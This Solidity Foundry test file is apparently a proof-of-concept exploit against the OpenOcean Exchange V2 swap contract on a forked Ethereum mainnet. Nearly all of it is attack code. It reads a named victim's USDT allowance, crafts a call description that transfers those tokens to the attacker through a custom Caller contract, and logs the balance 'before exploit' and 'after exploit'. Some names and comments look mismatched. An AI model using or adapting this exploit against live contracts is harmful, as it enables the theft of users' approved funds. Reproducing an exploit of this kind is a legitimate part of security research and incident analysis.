// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";
import "../OpenOceanExchangeV2/contracts/libraries/CallDescriptions.sol";


interface IOpenOceanExchange {
    function swap(
        IOpenOceanCaller caller,
        SwapDescription calldata desc,
        IOpenOceanCaller.CallDescription[] calldata calls
    ) external;
}

struct SwapDescription {
    IERC20 srcToken;
    IERC20 dstToken;
    address srcReceiver;
    address dstReceiver;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 guaranteedAmount;
    uint256 flags;
    address referrer;
    bytes permit;
}

contract ContractTest is Test {
    IOpenOceanExchange OPExchange = IOpenOceanExchange(0x6352a56caadC4F1E25CD6c75970Fa768A3304e64);
    address vic = 0xfBfE829909805ea31bD210829c5292a12F3778ea;
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Caller mcaller;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20763484);
        mcaller = new Caller();
    }

    function testBalancer_flashloan() public {
        emit log_named_uint(
            "balance before exploit:",
            usdt.balanceOf(address(this))
        );

        uint256 allowanceAmount = usdt.allowance(address(vic), address(OPExchange));
        require(allowanceAmount > 0, "No allowance given to the vulnerable swap contract");
        emit log_named_uint(
            "allowance to exchange:",
            allowanceAmount
        );

        bytes memory transferFromData = abi.encodeWithSelector(
            bytes4(keccak256("safeTransferFrom(address,address,address,uint256)")), // The selector for the ERC20 `transferFrom(address,address,uint256)` function
            usdt,
            vic,
            address(this),
            allowanceAmount
        );

        // Declare and initialize the array of CallDescription
        IOpenOceanCaller.CallDescription[] memory calls = new IOpenOceanCaller.CallDescription[](1);
        calls[0] = IOpenOceanCaller.CallDescription({
            target: 0, // Use uint160 to convert address to uint256
            gasLimit: 0,
            value: 0,
            data: transferFromData
        });

        SwapDescription memory desc = SwapDescription({
            srcToken: usdt, // USDT token
            dstToken: weth, // WETH token
            amount: usdt.balanceOf(address(this)), // Using the balance of USDT held by this contract
            minReturnAmount: 3416582307,
            srcReceiver: address(mcaller),
            dstReceiver: address(this),
            guaranteedAmount: 0,
            flags: 0,
            referrer: address(0),
            permit: ""
        });

        OPExchange.swap(IOpenOceanCaller(mcaller), desc, calls);

        emit log_named_uint(
            "balance after exploit:",
            weth.balanceOf(address(this))
        );
    }

    // Fallback function to receive Ether
    receive() external payable {}
}

contract Caller is IOpenOceanCaller {
    using CallDescriptions for CallDescription;

    receive() external payable {
        // Prevent ETH from being directly sent to this contract
        require(msg.sender != tx.origin);
    }

    function makeCall(CallDescription memory desc) external override {
        (bool success, string memory errorMessage) = desc.execute();
        if (!success) {
            revert(errorMessage);
        }
    }

    function makeCalls(CallDescription[] memory desc) external payable override {
        require(desc.length > 0, "OpenOcean: Invalid call parameter");
        for (uint256 i = 0; i < desc.length; i++) {
            this.makeCall(desc[i]);
        }
    }

    function safeTransferFrom(
        IERC20 token,
        address sender,
        address target,
        uint256 amount
    ) external {
        require(token.transferFrom(sender, target, amount), "TransferFrom failed");
    }

    function encodeTransferFrom(
        address token,
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        // Manually encoding transferFrom function selector and parameters
        bytes memory data = abi.encodeWithSelector(0x23b872dd, sender, recipient, amount);

        // Send the encoded data using a low-level call
        (bool success, ) = token.call(data);
        require(success, "TransferFrom failed");

        return success;
    }
}
